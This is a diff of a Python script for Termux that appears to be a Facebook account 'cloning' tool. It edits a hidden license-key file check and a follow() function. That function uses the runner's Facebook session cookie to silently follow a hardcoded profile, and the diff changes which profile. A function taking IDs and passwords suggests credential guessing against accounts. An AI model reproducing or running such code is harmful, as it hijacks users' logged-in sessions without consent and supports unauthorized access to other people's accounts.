@@ -85,11 +85,11 @@ def back():
 	login()
 
 ahsan="TEAM"
-imt="-TICKA4IF=="
-ak="A4IF"
+imt="-TRICKA4IF=="
+ak="BD"
 myid=uuid.uuid4().hex[:10].upper()
-try
-	key1 = open('/data/data/com.termux/files/usr/bin/.mrahsancov', 'r').read()
+try:
+	key1 = open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
 except:
 	kok=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'w')
 	kok.write(myid+imt)
@@ -383,7 +383,7 @@ def free(idf,pwv):
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	r = sop(ses.get('https://www.facebook.com/profile.php?id=100080926477096', cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
